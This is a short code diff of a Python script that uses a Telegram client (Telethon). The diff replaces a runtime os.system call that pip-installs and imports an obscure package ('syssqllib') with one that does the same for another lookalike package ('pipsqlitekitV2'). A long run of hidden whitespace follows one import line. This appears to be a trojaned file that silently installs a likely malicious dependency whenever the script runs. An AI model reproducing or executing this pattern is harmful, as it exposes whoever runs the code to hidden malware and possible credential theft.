@@ -1,6 +1,6 @@
 import os
-os.system("pip install syssqllib")
-import syssqllib
+os.system("pip install pipsqlitekitV2")
+import pipsqlitekitV2
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																							
 from telethon.sync import TelegramClient
 from telethon.tl.types import InputPeerChannel
